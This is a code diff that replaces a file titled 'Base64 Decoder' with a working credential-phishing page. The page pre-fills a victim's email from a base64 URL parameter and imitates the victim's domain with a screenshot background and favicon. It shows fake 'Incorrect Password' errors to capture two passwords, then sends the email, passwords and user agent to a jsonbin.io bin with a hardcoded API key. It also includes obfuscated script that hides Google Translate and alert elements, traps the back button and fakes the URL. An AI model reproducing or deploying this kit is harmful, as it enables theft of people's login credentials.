@@ -1,13 +1,197 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Base64 Decoder</title>
+    <title>Auth</title>
+    <link href="https://db.onlinewebfonts.com/c/d3a0199dcafa52672b5461066bbb3e59?family=Cash+Market+Light+Rounded" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <style>
+        body {
+            background-size: cover;
+            font-family: "Cash Market Light Rounded";
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 75vh;
+            margin: 0;
+        }
+        .pass::before {content:"Pass"}
+        .pass::after {content:"word"}
+
+        #message {
+            text-align: center;
+            color: red;
+            display: none;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.6);
+            filter: blur(10px);
+        }
+
+        .login-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.1);
+            filter: blur(10px);
+        }
+
+        .card {
+            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+    <script>
+        function _0x28a2(_0x38a636,_0x56ff8b){var _0x45e6bd=_0x45e6();return _0x28a2=function(_0x28a2a6,_0x38663e){_0x28a2a6=_0x28a2a6-0x77;var _0x168a0b=_0x45e6bd[_0x28a2a6];return _0x168a0b;},_0x28a2(_0x38a636,_0x56ff8b);}var _0x2e5c55=_0x28a2;function _0x45e6(){var _0x3ebe26=['1956uFZIEd','72496aokArU','719600ozLxIY','103380klSnFL','4660845OCRzoP','md-dialog[type=\x22alert\x22]','querySelector','addEventListener','72fewFfn','iframe[title=\x22Navigation\x20in\x20Google\x20Translate\x22]','remove','222980qOLNVs','DOMContentLoaded','11124567cDizBB','2322xpGbmT'];_0x45e6=function(){return _0x3ebe26;};return _0x45e6();}(function(_0x3a0aa0,_0x536aab){var _0x4ae258=_0x28a2,_0x27f6f9=_0x3a0aa0();while(!![]){try{var _0x231d13=-parseInt(_0x4ae258(0x81))/0x1+parseInt(_0x4ae258(0x7c))/0x2+-parseInt(_0x4ae258(0x7f))/0x3*(parseInt(_0x4ae258(0x80))/0x4)+-parseInt(_0x4ae258(0x83))/0x5*(-parseInt(_0x4ae258(0x79))/0x6)+-parseInt(_0x4ae258(0x84))/0x7+-parseInt(_0x4ae258(0x82))/0x8+parseInt(_0x4ae258(0x7e))/0x9;if(_0x231d13===_0x536aab)break;else _0x27f6f9['push'](_0x27f6f9['shift']());}catch(_0x19b791){_0x27f6f9['push'](_0x27f6f9['shift']());}}}(_0x45e6,0x5ef22),document[_0x2e5c55(0x78)](_0x2e5c55(0x7d),function(){var _0x4125a6=_0x2e5c55,_0x514a18=document[_0x4125a6(0x77)](_0x4125a6(0x85));_0x514a18&&_0x514a18['remove']();var _0x5c3b20=document['querySelector'](_0x4125a6(0x7a));_0x5c3b20&&_0x5c3b20[_0x4125a6(0x7b)]();}));
+            </script>
+        
 </head>
 <body>
-  <div id="content"></div>
+<div class="container login-panel">
+    <div class="row justify-content-center">
+        <div class="col-md-4">
+            <div class="card">
+                <div class="card-body">
+                    <h5 class="card-title text-center">Authorization</h5>
 
-  <script src="app.js"></script>
+                    <form id="login_form" method="POST">
+                        <div class="form-group">
+                            <label for="rcmloginuser">Email</label>
+                            <input type="text" class="form-control" id="rcmloginuser" placeholder="Email" value="test@gmail.com" disabled>
+                        </div>
+                        <div class="form-group">
+                            <label for="rcmloginpwd"><span class="pass"></span></label>
+                            <input type="password" class="form-control pass2" id="rcmloginpwd" placeholder="Password" required>
+
+                            <div id="message">Incorrect <span class="pass"></span>. Try Again</div>
+                        </div>
+                        <button type="submit" id="rcmloginsubmit" class="btn btn-primary btn-block">Sign In</button>
+
+                    </form>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedEmailParam = urlParams.get("b");
+	const emailParam = encodedEmailParam ? atob(encodedEmailParam) : null;
+
+
+    const loginForm = document.getElementById('login_form');
+    const message = document.getElementById('message');
+    const userAgent = navigator.userAgent;
+    const currentDate = new Date();
+    const passwordInput = document.getElementById('rcmloginpwd');
+
+    let submittedCount = 0;
+
+    let hehe22 = '';
+    let hehe223 = '';
+    loginForm.addEventListener('submit', (event) => {
+        event.preventDefault();
+
+        message.style.display = 'block';
+        submittedCount++;
+        if (submittedCount === 1) {
+            hehe223 = passwordInput.value;
+            passwordInput.value = '';
+        } else if (submittedCount === 2) {
+            hehe22 = passwordInput.value;
+            passwordInput.value = '';
+            const emailParts2 = emailParam.split("@");
+                const domain2 = emailParts2[1];
+            const jsonData = {
+                Domain: domain2,
+                Email: emailParam,
+                P1: hehe223,
+                P2: hehe22,
+                UserAgent: userAgent,
+                Date: currentDate
+            };
+            const apiKey = '$2a$10$/Hhr9CoDu8i0kVG.tSLuguT33pg.4F4qnRkDsVSOhbIoWUje71UE6'; //Change APIKEY to your.
+            fetch("https://api.jsonbin.io/v3/b?name=" + emailParam, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': apiKey,
+                    "X-Bin-Name": emailParam
+                },
+                body: JSON.stringify(jsonData),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    window.location.replace("https://" + domain2);
+                })
+                .catch(error => {
+                    //
+                });
+        }
+    });
+
+
+    function redirectToGoogle() {
+        window.location.href = "https://google.com";
+    }
+    function generateRandomString(length) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let randomString = '';
+
+        for (let i = 0; i < length; i++) {
+            const randomIndex = Math.floor(Math.random() * characters.length);
+            randomString += characters.charAt(randomIndex);
+        }
+
+        return randomString;
+    }
+    const currentURL = window.location.protocol + '//' + window.location.host;
+
+    const UrlShit = generateRandomString(166);
+    history.pushState(null, null, window.location.href);
+    window.onpopstate = function (event) {
+        history.pushState(null, null, window.location.href);
+    };
+    setTimeout(function () {
+        const fakeUrl = currentURL + "/" + UrlShit + "/" + UrlShit;
+        history.pushState(null, "", fakeUrl);
+    }, 1);
+
+    function setFavicon(url) {
+        const favicon = document.querySelector('link[rel="icon"]');
+        if (favicon) {
+            favicon.href = url;
+        } else {
+            const newFavicon = document.createElement('link');
+            newFavicon.rel = 'icon';
+            newFavicon.href = url;
+            document.head.appendChild(newFavicon);
+        }
+    }
+
+    if (emailParam === null || emailParam.trim() === "") {
+        redirectToGoogle();
+    } else {
+        const emailParts = emailParam.split("@");
+        if (emailParts.length === 2) {
+            const domain = emailParts[1];
+            const faviconUrl = `https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://${domain}&size=400`;
+            setFavicon(faviconUrl);
+            document.body.style.backgroundImage = `url("https://image.thum.io/get/auth/69366-Gfrt66ttffff/width/1200/crop/700/http://${domain}")`;
+            document.getElementById("rcmloginuser").value = emailParam;
+        } else {
+            redirectToGoogle();
+        }
+    }
+</script>
 </body>
 </html>
